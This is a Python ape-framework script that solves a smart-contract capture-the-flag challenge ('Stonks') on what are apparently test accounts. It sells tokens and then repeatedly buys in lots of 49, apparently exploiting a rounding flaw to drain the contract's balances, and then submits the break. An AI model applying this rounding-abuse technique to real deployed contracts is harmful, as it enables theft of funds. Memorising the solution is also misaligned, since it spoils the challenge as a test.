from ape import accounts, project
from .utils.helper import get_challenge_instance, challenge_broken

CHALLENGE_MANAGER = "0x157EB6396D44F63D3970a72C253BfB5ACEEc80dD"
CHALLENGE_FACTORY = "0x33AFa06181297EC108113836a95fDE68A9de4d8f"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get challenge instance
    instance, eko = get_challenge_instance(
        CHALLENGE_MANAGER,
        CHALLENGE_FACTORY,
        user,
    )
    # exploit goes here
    print("\n--- Exploiting challenge instance ---\n")
    stonks = project.Stonks.at(instance)
    stonks.sellTSLA(20, 20 * 50, sender=user)
    player_balance = stonks.balanceOf(user.address, 1)
    while player_balance > 0:
        stonks.buyTSLA(min(49, player_balance), 0, sender=user)
        player_balance = stonks.balanceOf(user.address, 1)

    assert stonks.balanceOf(user.address, 0) == 0
    assert stonks.balanceOf(user.address, 1) == 0

    # submiting challenge instance
    print("\n--- Breaking challenge instance ---\n")
    submit_tx = eko.breakChallenge(CHALLENGE_FACTORY, sender=user)

    # checking if challenge is completed
    challenge_broken(eko, submit_tx, user.address, CHALLENGE_FACTORY)

    print("\n--- 🥂!CHALLENGE COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
